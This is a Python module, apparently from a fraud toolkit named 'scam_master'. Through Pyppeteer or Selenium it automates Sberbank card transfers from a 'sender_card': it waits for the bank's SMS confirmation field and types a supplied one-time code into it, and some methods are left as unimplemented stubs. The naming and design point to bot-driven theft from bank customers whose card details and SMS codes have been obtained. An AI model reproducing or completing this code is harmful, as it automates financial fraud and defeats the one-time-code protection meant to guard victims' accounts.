import asyncio
from pyppeteer.page import Page as PyppPage
from pyppeteer.errors import NetworkError
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver.common.by import By
from loguru import logger
from time import sleep

from scam_master.infrastructure.banks.interface import IBankTransfer
from scam_master.services.models.transactions import Card
from scam_master.services.models.errors import UNKNOWN_TRANSFER_STATUS, BankError


class SberTransfer(IBankTransfer):
    '''
    Сбербанк.
    Uses Pyppeteer and Selenium to interact with the site.
    '''

    @staticmethod
    async def fill_out_transfer_form(page: PyppPage | WebDriver, url: str, sender_card: Card, recipient_card_number: str, amount: int) -> None:
        logger.warning('Not implemented')
        raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    async def check_confirm_transfer(page: PyppPage | WebDriver) -> None:
        try:
            if isinstance(page, PyppPage):
                return await SberTransfer._check_confirm_transfer_pyppeteer(page)
            elif isinstance(page, WebDriver):
                return SberTransfer._check_confirm_transfer_selenium(page)
            else:
                logger.warning(f'Unsupported driver: {type(page)}')
                raise UNKNOWN_TRANSFER_STATUS
        
        except (BankError, NetworkError):
            raise UNKNOWN_TRANSFER_STATUS
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    async def confirm_transfer(page: PyppPage | WebDriver, sms_code: str) -> None:
        try:
            if isinstance(page, PyppPage):
                return await SberTransfer._confirm_transfer_pyppeteer(page, sms_code)
            elif isinstance(page, WebDriver):
                return SberTransfer._confirm_transfer_selenium(page, sms_code)
            else:
                logger.warning(f'Unsupported driver: {type(page)}')
                raise UNKNOWN_TRANSFER_STATUS
        
        except (BankError, NetworkError):
            raise UNKNOWN_TRANSFER_STATUS
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS    


    @staticmethod
    async def check_transfer_status(page: PyppPage | WebDriver) -> None:
        logger.warning('Not implemented')
        raise UNKNOWN_TRANSFER_STATUS
    

    @staticmethod
    async def _check_confirm_transfer_pyppeteer(page: PyppPage):
        await asyncio.sleep(6)

        field = await page.querySelector('input[id="passwordEdit"]')
        if not field:
            raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    def _check_confirm_transfer_selenium(page: WebDriver):
        sleep(6)

        fields = page.find_elements(By.CSS_SELECTOR, 'input[id="passwordEdit"]')
        if not fields:
            raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    async def _confirm_transfer_pyppeteer(page: PyppPage, sms_code: str) -> None:
        await asyncio.sleep(2)
        await page.waitForSelector('input[id="passwordEdit"]')
        await page.type('input[id="passwordEdit"]', sms_code)
    

    @staticmethod
    def _confirm_transfer_selenium(page: WebDriver, sms_code: str) -> None:
        sleep(2)
        field = page.find_element(By.CSS_SELECTOR, 'input[id="passwordEdit"]')
        field.send_keys(sms_code)
